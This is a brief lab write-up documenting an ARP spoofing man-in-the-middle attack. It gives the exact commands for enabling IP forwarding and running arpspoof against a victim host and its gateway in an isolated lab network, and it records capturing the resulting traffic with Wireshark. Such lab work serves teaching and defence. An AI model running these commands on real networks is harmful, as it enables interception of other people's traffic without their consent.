# ARP Spoofing – Attack Steps

This section documents the steps used to simulate an ARP spoofing attack in the lab.

## Tool Used
- arpspoof (dsniff suite)

## Attacker and Target
- Attacker: Kali Linux (192.168.56.10)
- Victim: Ubuntu (192.168.56.20)

## Step-by-Step Execution

### 1. Enable IP Forwarding on Attacker
`sudo sysctl -w net.ipv4.ip_forward=1`

### 2. Launch ARP Spoofing Attack
// Spoofing Ubuntu that i am the Gateway.\
`sudo arpspoof -i eth0 -t 192.168.56.20 192.168.56.1`\
// Spoofing Gateway that i am Ubuntu.\
`sudo arpspoof -i eth0 -t 192.168.56.1 192.168.56.20`

> Replace `eth0` with the correct network interface.

### 3. Capture Traffic
- Wireshark was running on the victim machine during the attack.

### 4. Stop the Attack
Press `Ctrl + C` to stop the ARP spoofing process.

## Notes
- The attack was executed only within the isolated lab network.
- ARP cache poisoning was used to manipulate MAC–IP mappings.
